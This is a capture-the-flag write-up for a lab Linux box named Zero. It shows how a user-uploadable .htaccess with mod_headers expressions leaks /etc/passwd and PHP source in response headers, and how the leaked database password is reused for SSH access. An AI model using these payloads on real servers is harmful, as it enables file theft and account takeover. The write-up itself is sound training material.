## Overview

Zero is an insane-difficulty Linux box built around a misconfigured shared-hosting stack. A web app provisions SFTP accounts whose `public_html` directory is served by Apache and accepts a user-supplied `.htaccess`. Because `AllowOverride` lets that `.htaccess` enable `mod_headers`, an attacker can use Apache's `expr=%{file:...}` expression syntax to read any server-readable file and have it returned in a response header. Dumping the PHP source reveals a hardcoded database password that is reused as the SSH password for `zroadmin`, giving the user shell. This post stops at `user.txt`.

## Recon

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu |
| 80   | HTTP    | Apache httpd 2.4.41 (Ubuntu) |

Only two ports. SSH is current and unremarkable, so the web service on 80 is the way in.

```bash
nmap -sC -sV 10.129.234.62
```

## Enumeration

The web app advertises an "insecure FTP" style service: you request an account and it returns a generated username (`zro-XXXXXXXX`), a password, and a link to your personal page at `http://zero.vl/~<user>/`. Logging into the SFTP service drops you in your own directory containing `public_html` with two files:

```bash
sftp zro-9c53d89c@zero.vl
sftp> cd public_html
sftp> ls -lah
# .htaccess   index.html
sftp> get .htaccess
```

The pre-seeded `.htaccess` already sets a custom response header:

```apache
Header always set X-Zero-Customer 'zro-9c53d89c'
```

That single line is the whole box. It proves Apache is honouring **our** `.htaccess` and that `mod_headers` is enabled for this directory — so we control how Apache builds response headers for our page.

## Foothold

Apache's `mod_headers` supports an expression syntax (`expr=`) with helper functions, two of which are dangerous here: `file:` reads a file's contents and `base64:` encodes the result. Apache evaluates these as the **web-server user**, which can read files our SFTP account cannot.

First, prove header expressions evaluate:

```bash
echo 'Header set foo-checksum "expr=%{md5:foo}"' >> .htaccess
# re-upload .htaccess over sftp, then:
curl -I http://zero.vl/~zro-9c53d89c/
# foo-checksum: acbd18db4cc2f85cedef654fccc4a4d8   <-- md5("foo"), so expr works
```

Now turn it into arbitrary file read. Wrap the file read in `base64:` so multi-line / source content survives intact inside a header:

```bash
echo 'Header always set X-Leak "expr=%{base64:%{file:/etc/passwd}}"' >> .htaccess
# re-upload, then read + decode the leaked header:
curl -s -I http://zero.vl/~zro-9c53d89c/ | grep -i '^X-Leak:' | cut -d' ' -f2 | base64 -d
```

`/etc/passwd` confirms the primitive and reveals interesting accounts including `zroadmin`. Next, read the application source — the stats page leaks a database credential:

```bash
echo 'Header always set X-Leak "expr=%{base64:%{file:/var/www/html/stats.php}}"' >> .htaccess
# re-upload + decode -> source contains:
#   new mysqli("localhost", "zroadmin", "<redacted>", "zro");
```

That MySQL password is reused as the SSH password for the `zroadmin` Unix account:

```bash
sshpass -p '<redacted>' ssh -o StrictHostKeyChecking=no zroadmin@10.129.234.62
```
